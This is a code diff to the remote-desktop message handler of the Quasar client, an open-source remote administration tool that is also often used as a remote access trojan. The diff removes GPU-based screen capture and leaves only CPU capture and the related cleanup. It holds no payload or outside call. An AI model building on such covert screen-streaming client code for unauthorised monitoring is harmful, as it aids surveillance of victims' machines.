@@ -13,7 +13,6 @@ using System.Threading;
 using System.Diagnostics;
 using Quasar.Common.Messages.Monitoring.RemoteDesktop;
 using Quasar.Common.Messages.other;
-using Quasar.Client.Helper.ScreenStuff;
 using System.Collections.Concurrent;
 
 namespace Quasar.Client.Messages
@@ -27,8 +26,6 @@ namespace Quasar.Client.Messages
         private ISender _clientMain;
         private Thread _captureThread;
         private CancellationTokenSource _cancellationTokenSource;
-
-        private ScreenHelperGPU _screenHelper;
 
         private bool _useGpu = false;
 
@@ -95,7 +92,7 @@ namespace Quasar.Client.Messages
 
             _useGpu = message.UseGPU;
 
-            var monitorBounds = ScreenHelperGPU.GetBounds(message.DisplayIndex);
+            var monitorBounds = ScreenHelperCPU.GetBounds(message.DisplayIndex);
             var resolution = new Resolution { Height = monitorBounds.Height, Width = monitorBounds.Width };
 
             if (_streamCodec == null)
@@ -157,12 +154,6 @@ namespace Quasar.Client.Messages
                 }
                 _desktop.Dispose();
                 _desktop = null;
-            }
-
-            if (_screenHelper != null)
-            {
-                _screenHelper.Dispose();
-                _screenHelper = null;
             }
 
             if (_streamCodec != null)
@@ -234,19 +225,7 @@ namespace Quasar.Client.Messages
         {
             try
             {
-                if (_useGpu)
-                {
-                    if (_screenHelper == null)
-                    {
-                        _screenHelper = new ScreenHelperGPU(_displayIndex);
-                    }
-
-                    _desktop = _screenHelper.CaptureScreen();
-                }
-                else
-                {
-                    _desktop = ScreenHelperCPU.CaptureScreen(_displayIndex);
-                }
+                _desktop = ScreenHelperCPU.CaptureScreen(_displayIndex);
 
                 if (_desktop == null)
                 {
@@ -386,7 +365,6 @@ namespace Quasar.Client.Messages
             StopScreenStreaming();
             _streamCodec?.Dispose();
             _cancellationTokenSource?.Dispose();
-            _screenHelper?.Dispose();
             _frameRequestEvent?.Dispose();
         }
 
@@ -397,7 +375,6 @@ namespace Quasar.Client.Messages
                 StopScreenStreaming();
                 _streamCodec?.Dispose();
                 _cancellationTokenSource?.Dispose();
-                _screenHelper?.Dispose();
                 _frameRequestEvent?.Dispose();
             }
         }
